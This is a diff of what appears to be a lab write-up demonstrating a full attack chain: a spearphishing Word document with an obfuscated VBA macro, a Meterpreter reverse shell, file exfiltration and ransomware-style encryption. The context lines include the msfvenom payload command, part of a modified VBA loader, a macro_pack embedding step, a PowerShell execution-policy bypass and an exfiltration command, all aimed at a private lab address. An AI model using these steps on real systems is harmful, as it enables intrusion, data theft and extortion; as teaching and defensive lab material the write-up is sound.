@@ -4,7 +4,7 @@ This document outlines the setup and execution of a demonstration showcasing a r
 <br/>
 
 ## Attack Description
-In the scenario presented below, the adversary will inject a meticulously crafted  **Word document** with a **VBA Script** as an obfuscated payload. Subsequently, the adversary will dispatch this document to the victim via a tailored and customized email message ([Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)).<br/>
+In the scenario presented below, the adversary will embed into a meticulously crafted  **Word document** a **VBA Script**, as an obfuscated payload. Subsequently, the adversary will dispatch this document to the victim via a tailored and customized email message ([Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)).<br/>
 It is presupposed that the victim will succumb to the **Spearphishing Attack** and download and open the document. Upon opening, Microsoft Word will **execute** the VBA Script ([Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/005/)), enabling the adversary to establish a **reverse shell** on the victim’s platform and remotely control it.<br/>
 The attacker will then **exfiltrate** the victim’s files through the established channel ([Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)) and **encrypt** them to **compromise** their **integrity** and demand a **ransom** ([Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)).
 
@@ -33,7 +33,7 @@ To create a Word document containing a malicious VBA script, I employed `msfveno
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.56.102 LPORT=4444 -f vba > reverse_shell_exploit.vba
 ```
-This command generates a VBA script that attempts to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To enhance its effectiveness, I modified the script to launch a thread to manage this connection:
+This command generates a VBA script that, when executed, attempts to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To enhance its effectiveness, I modified the script to launch a thread to manage the connection:
 ```vb
 #If VBA7 Then
     Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
@@ -96,7 +96,7 @@ Private Sub Workbook_Open()
     Document_Open
 End Sub
 ```
-To inject this payload into a Word document, I used `macro_pack` by executing the following command:
+To embed this payload into a Word document, I used `macro_pack` by executing the following command:
 ```
 macro_pack.exe -f reverse_shell_exploit.vba -o -G malicious.docm
 ```
@@ -219,7 +219,7 @@ and subsequently executed:
 ```
 execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\\Users\\enrico\\Documents\\encrypt.ps1"
 ```
-To minimise the likelihood of leaving traces, I also exfiltrate the encryption/decryption key:
+To avoid leaving traces, I also exfiltrate the encryption/decryption key:
 ```
 download C:\\Users\\enrico\\Documents\\encryption_key.bin /home/kali/Desktop/Exfiltrated
 ```
